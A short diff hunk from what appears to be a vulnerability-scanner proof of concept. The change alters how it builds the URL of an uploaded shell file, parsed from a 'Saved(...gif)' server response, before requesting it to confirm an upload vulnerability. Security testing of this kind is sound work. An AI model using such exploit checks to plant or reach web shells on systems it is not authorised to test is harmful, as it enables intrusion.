@@ -69,7 +69,7 @@ class Poc(ABPoc):
             if code == 200:
                 shell = re.findall("Saved\(\'(.+?.gif)", body)
                 if shell:
-                    aspurl = util.urljoin(self.target, '../' + shell[0])
+                    aspurl = self.target + '../' + shell[0]
                     code, head, body, ecode, redirect_url = hh.http(aspurl)
                     if code == 200:
                         #security_hole('upload vulnerable:%s' % aspurl)
